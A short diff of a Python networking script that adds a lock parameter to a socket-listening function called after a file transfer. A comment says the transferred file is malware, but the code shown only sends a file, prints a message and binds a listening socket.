@@ -94,11 +94,11 @@ def send_file(file_path, file_name, dest_ip, rep_port):
     print(f'File has been transferred successfully to {dest_ip}.')
 
     # Listening for Response only after Malware it's succesfully sent
-    start_listening(rep_port)
+    start_listening(rep_port, lock)
     return 0
 
 
-def start_listening(port):
+def start_listening(port, lock):
     # Initialize Socket & Bind Address
     sock = socket.socket()
     sock.bind((CENTRAL_IP, port))
